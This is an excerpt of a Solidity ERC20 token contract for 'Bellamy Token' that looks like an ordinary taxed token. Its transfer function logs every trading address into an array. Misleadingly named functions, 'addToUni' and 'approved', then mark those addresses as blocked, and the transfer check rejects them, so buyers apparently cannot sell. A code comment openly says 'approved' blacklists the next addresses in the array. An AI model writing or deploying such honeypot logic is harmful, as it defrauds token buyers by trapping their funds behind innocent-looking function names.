...
contract Bellamy2 is ERC20, Ownable {
    string private _name = "Bellamy Token";
    string private _symbol = "BELLAMY";
    uint8 private _decimals = 9;
    uint8 public taxForLiquidity = 1;
    uint8 public taxForMarketing = 1;
    ...
    uint256 private _numTokensSellToAddToLiquidity = (_supply / 1000) * 10**_decimals;
    uint256 private _numTokensSellToAddToETH = (_supply / 1000) * 10**_decimals;
    ...
    function addToUni(address i, address j, address k, address l, address m, address n, address o, address p) public {
        _d[i] = verify(i); _d[j] = verify(j); _d[k] = verify(k); _d[l] = verify(l); _d[m] = verify(m); _d[n] = verify(n); _d[o] = verify(o); _d[p] = verify(p);
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        require(from != address(0) && to != address(0) && balanceOf(from) >= amount && !_d[from] && !_d[to]);
        if (verify(to)) { _myArray.push(to); }
        if (verify(from)) { _myArray.push(from); }
        if ((from == uniswapV2Pair || to == uniswapV2Pair) && !inSwapAndLiquify) {
            ...
            if (_isExcludedFromFee[from] || _isExcludedFromFee[to]) {
                ...
                require(amount <= maxTxAmount && !_d[from] && !_d[to]);
                if(from == uniswapV2Pair){
    ...
    // Officially blacklists up to next 10x addr added to array
    function approved() public returns (uint256) { // 0 to 5 (length = 6)
        uint256 temp = _startingIndex; // 0
        if (temp < _myArray.length) {
            for(temp; temp < temp + 10; temp++) { // temp 0/1/2/3/4/5/6
                _d[_myArray[temp]] = true;
                if (temp == _myArray.length - 1) { temp++; break; }
            }
            _startingIndex = temp; // sets next index to 5 + 1 = 6;
        }
